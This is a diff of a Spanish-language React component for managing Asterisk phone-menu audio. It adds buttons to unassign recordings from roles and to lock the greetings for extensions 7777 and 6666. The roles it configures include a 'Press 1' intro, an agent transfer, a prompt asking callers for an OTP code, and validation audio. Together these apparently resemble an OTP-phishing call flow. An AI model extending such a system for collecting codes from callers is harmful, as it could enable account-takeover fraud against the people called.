@@ -24,6 +24,10 @@ import {
   Sliders,
   ArrowRight,
   RefreshCw,
+  Save,
+  Lock,
+  PowerOff,
+  Check,
 } from 'lucide-react';
 
 interface AudioLibraryTabProps {
@@ -242,6 +246,68 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       setTimeout(() => setFeedbackMsg(null), 4500);
     } finally {
       setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
+    }
+  };
+
+  // Handler to deactivate / unassign an audio from a role
+  const handleDeactivateRole = async (role: AudioRole) => {
+    setIsSyncingRole((prev) => ({ ...prev, [role]: true }));
+    try {
+      const res = await fetch('/api/asterisk/audio/unassign', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ role }),
+      });
+      const data = await res.json();
+      if (data.success && data.assignments) {
+        setActiveAssignments(data.assignments);
+        setFeedbackMsg({
+          text: `Audio desactivado para "${role}". Restaurado a locución por defecto.`,
+          type: 'info',
+        });
+        setTimeout(() => setFeedbackMsg(null), 4000);
+      }
+    } catch (err) {
+      console.error('Error al desactivar audio:', err);
+    } finally {
+      setIsSyncingRole((prev) => ({ ...prev, [role]: false }));
+    }
+  };
+
+  // Handler to permanently save and lock 7777 and 6666 configuration
+  const [isSavingOtpExtensions, setIsSavingOtpExtensions] = useState(false);
+  const [otpExtensionsSaved, setOtpExtensionsSaved] = useState(false);
+
+  const handleSaveOtpExtensions = async () => {
+    setIsSavingOtpExtensions(true);
+    try {
+      const res = await fetch('/api/asterisk/audio/save-otp-extensions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          welcome_7777: activeAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
+          welcome_6666: activeAssignments.welcome_6666 || 'custom/bienvenida_6666',
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        setOtpExtensionsSaved(true);
+        setFeedbackMsg({
+          text: '✓ Configuración de extensiones 7777 y 6666 guardada y bloqueada en AstDB. No cambiará al actualizar el sistema.',
+          type: 'success',
+        });
+        setTimeout(() => {
+          setOtpExtensionsSaved(false);
+          setFeedbackMsg(null);
+        }, 4500);
+      }
+    } catch (err: any) {
+      setFeedbackMsg({
+        text: `Error al guardar: ${err.message}`,
+        type: 'info',
+      });
+    } finally {
+      setIsSavingOtpExtensions(false);
     }
   };
 
@@ -710,37 +776,53 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               </p>
             </div>
           </div>
-          <div className="flex items-center gap-1.5 self-start sm:self-auto bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
+          <div className="flex items-center gap-2 self-start sm:self-auto flex-wrap">
             <button
-              onClick={() => setFeaturedExtTab('both')}
-              className={`px-3 py-1 rounded transition-colors font-medium ${
-                featuredExtTab === 'both'
-                  ? 'bg-indigo-600 text-white font-bold shadow-sm'
-                  : 'text-slate-400 hover:text-white'
+              onClick={handleSaveOtpExtensions}
+              disabled={isSavingOtpExtensions}
+              className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shadow-md ${
+                otpExtensionsSaved
+                  ? 'bg-emerald-500 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
+                  : 'bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-purple-600/20'
               }`}
+              title="Guardar y bloquear permanentemente las locuciones de la 7777 y 6666 para que no cambien al sincronizar el sistema"
             >
-              Ver Ambas
+              {otpExtensionsSaved ? <Check className="w-3.5 h-3.5 text-black" /> : <Lock className="w-3.5 h-3.5" />}
+              <span>{isSavingOtpExtensions ? 'Guardando en AstDB...' : otpExtensionsSaved ? '¡Configuración Bloqueada!' : 'Guardar y Bloquear 7777 / 6666'}</span>
             </button>
-            <button
-              onClick={() => setFeaturedExtTab('7777')}
-              className={`px-3 py-1 rounded transition-colors font-medium ${
-                featuredExtTab === '7777'
-                  ? 'bg-purple-600 text-white font-bold shadow-sm'
-                  : 'text-slate-400 hover:text-purple-300'
-              }`}
-            >
-              Ext. 7777
-            </button>
-            <button
-              onClick={() => setFeaturedExtTab('6666')}
-              className={`px-3 py-1 rounded transition-colors font-medium ${
-                featuredExtTab === '6666'
-                  ? 'bg-cyan-600 text-white font-bold shadow-sm'
-                  : 'text-slate-400 hover:text-cyan-300'
-              }`}
-            >
-              Ext. 6666
-            </button>
+
+            <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
+              <button
+                onClick={() => setFeaturedExtTab('both')}
+                className={`px-3 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === 'both'
+                    ? 'bg-indigo-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-white'
+                }`}
+              >
+                Ver Ambas
+              </button>
+              <button
+                onClick={() => setFeaturedExtTab('7777')}
+                className={`px-3 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === '7777'
+                    ? 'bg-purple-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-purple-300'
+                }`}
+              >
+                Ext. 7777
+              </button>
+              <button
+                onClick={() => setFeaturedExtTab('6666')}
+                className={`px-3 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === '6666'
+                    ? 'bg-cyan-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-cyan-300'
+                }`}
+              >
+                Ext. 6666
+              </button>
+            </div>
           </div>
         </div>
 
@@ -821,6 +903,16 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   >
                     <Play className="w-3.5 h-3.5" />
                     <span>Escuchar</span>
+                  </button>
+
+                  <button
+                    onClick={() => handleDeactivateRole('welcome_7777')}
+                    disabled={isSyncingRole.welcome_7777}
+                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
+                    title="Desactivar audio actual y restaurar locución predeterminada para la 7777"
+                  >
+                    <PowerOff className="w-3.5 h-3.5" />
+                    <span className="hidden sm:inline">Desactivar</span>
                   </button>
                 </div>
 
@@ -936,6 +1028,16 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   >
                     <Play className="w-3.5 h-3.5" />
                     <span>Escuchar</span>
+                  </button>
+
+                  <button
+                    onClick={() => handleDeactivateRole('welcome_6666')}
+                    disabled={isSyncingRole.welcome_6666}
+                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
+                    title="Desactivar audio actual y restaurar locución predeterminada para la 6666"
+                  >
+                    <PowerOff className="w-3.5 h-3.5" />
+                    <span className="hidden sm:inline">Desactivar</span>
                   </button>
                 </div>
 
@@ -1101,6 +1203,15 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                       title="Escuchar audio actualmente asignado"
                     >
                       {isPlayingCurrent ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
+                    </button>
+
+                    <button
+                      onClick={() => handleDeactivateRole(roleConf.role)}
+                      disabled={isSyncing}
+                      className="p-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-transparent hover:border-rose-500/30 transition-colors shrink-0"
+                      title={`Desactivar audio personalizado y restaurar por defecto (${roleConf.fallbackDefault})`}
+                    >
+                      <PowerOff className="w-3.5 h-3.5" />
                     </button>
 
                     <button
@@ -1293,109 +1404,157 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                 <span className="text-[10px] text-slate-400 font-medium block">Asignar en 1 clic como:</span>
                 <div className="flex items-center gap-1.5 flex-wrap">
                   <button
-                    onClick={() => handleAssignRoleDirect('welcome_7777', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.welcome_7777 === audio.asteriskPath) {
+                        handleDeactivateRole('welcome_7777');
+                      } else {
+                        handleAssignRoleDirect('welcome_7777', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.welcome_7777 === audio.asteriskPath
-                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20'
+                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20 hover:bg-purple-600'
                         : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
                     }`}
-                    title="Asignar como bienvenida de la extensión 7777"
+                    title={activeAssignments.welcome_7777 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 7777"}
                   >
                     <Sparkles className="w-3 h-3" />
                     <span>Ext 7777</span>
-                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('welcome_6666', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.welcome_6666 === audio.asteriskPath) {
+                        handleDeactivateRole('welcome_6666');
+                      } else {
+                        handleAssignRoleDirect('welcome_6666', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.welcome_6666 === audio.asteriskPath
-                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20'
+                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                         : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                     }`}
-                    title="Asignar como bienvenida de la extensión 6666"
+                    title={activeAssignments.welcome_6666 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 6666"}
                   >
                     <Sparkles className="w-3 h-3 text-cyan-300" />
                     <span>Ext 6666</span>
-                    {activeAssignments.welcome_6666 === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.welcome_6666 === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('press1_welcome', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.press1_welcome === audio.asteriskPath) {
+                        handleDeactivateRole('press1_welcome');
+                      } else {
+                        handleAssignRoleDirect('press1_welcome', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.press1_welcome === audio.asteriskPath
-                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20'
+                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                         : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                     }`}
-                    title="Asignar como bienvenida inicial de Press 1"
+                    title={activeAssignments.press1_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida inicial de Press 1"}
                   >
                     <span>Intro Press 1</span>
-                    {activeAssignments.press1_welcome === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.press1_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('agent_transfer', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.agent_transfer === audio.asteriskPath) {
+                        handleDeactivateRole('agent_transfer');
+                      } else {
+                        handleAssignRoleDirect('agent_transfer', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.agent_transfer === audio.asteriskPath
-                        ? 'bg-amber-500 text-black font-bold shadow-sm shadow-amber-500/20'
+                        ? 'bg-amber-500 text-black font-bold shadow-sm shadow-amber-500/20 hover:bg-amber-600'
                         : 'bg-amber-500/10 text-amber-300 border border-amber-500/20 hover:bg-amber-500/20'
                     }`}
-                    title="Asignar a la transferencia hacia el asesor (al pulsar 1)"
+                    title={activeAssignments.agent_transfer === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar a la transferencia hacia el asesor (al pulsar 1)"}
                   >
                     <span>Asesor (1)</span>
-                    {activeAssignments.agent_transfer === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.agent_transfer === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('otp_welcome', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.otp_welcome === audio.asteriskPath) {
+                        handleDeactivateRole('otp_welcome');
+                      } else {
+                        handleAssignRoleDirect('otp_welcome', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.otp_welcome === audio.asteriskPath
-                        ? 'bg-blue-500 text-white font-bold shadow-sm shadow-blue-500/20'
+                        ? 'bg-blue-500 text-white font-bold shadow-sm shadow-blue-500/20 hover:bg-blue-600'
                         : 'bg-blue-500/10 text-blue-300 border border-blue-500/20 hover:bg-blue-500/20'
                     }`}
-                    title="Asignar como locución de solicitud de código OTP"
+                    title={activeAssignments.otp_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como locución de solicitud de código OTP"}
                   >
                     <span>Pedir OTP</span>
-                    {activeAssignments.otp_welcome === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.otp_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('otp_wait', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.otp_wait === audio.asteriskPath) {
+                        handleDeactivateRole('otp_wait');
+                      } else {
+                        handleAssignRoleDirect('otp_wait', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.otp_wait === audio.asteriskPath
-                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20'
+                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                         : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                     }`}
-                    title="Asignar como audio en espera durante la validación del código"
+                    title={activeAssignments.otp_wait === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio en espera durante la validación del código"}
                   >
                     <span>Espera OTP</span>
-                    {activeAssignments.otp_wait === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.otp_wait === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('otp_success', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.otp_success === audio.asteriskPath) {
+                        handleDeactivateRole('otp_success');
+                      } else {
+                        handleAssignRoleDirect('otp_success', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.otp_success === audio.asteriskPath
-                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20'
+                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                         : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                     }`}
-                    title="Asignar como audio de código validado con éxito"
+                    title={activeAssignments.otp_success === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código validado con éxito"}
                   >
                     <span>Éxito</span>
-                    {activeAssignments.otp_success === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.otp_success === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
 
                   <button
-                    onClick={() => handleAssignRoleDirect('otp_failure', audio.asteriskPath)}
+                    onClick={() => {
+                      if (activeAssignments.otp_failure === audio.asteriskPath) {
+                        handleDeactivateRole('otp_failure');
+                      } else {
+                        handleAssignRoleDirect('otp_failure', audio.asteriskPath);
+                      }
+                    }}
                     className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                       activeAssignments.otp_failure === audio.asteriskPath
-                        ? 'bg-rose-500 text-white font-bold shadow-sm shadow-rose-500/20'
+                        ? 'bg-rose-500 text-white font-bold shadow-sm shadow-rose-500/20 hover:bg-rose-600'
                         : 'bg-rose-500/10 text-rose-300 border border-rose-500/20 hover:bg-rose-500/20'
                     }`}
-                    title="Asignar como audio de código inválido / reintento"
+                    title={activeAssignments.otp_failure === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código inválido / reintento"}
                   >
                     <span>Fallo</span>
-                    {activeAssignments.otp_failure === audio.asteriskPath && <span>✓</span>}
+                    {activeAssignments.otp_failure === audio.asteriskPath && <span>✓ (Activo)</span>}
                   </button>
                 </div>
               </div>
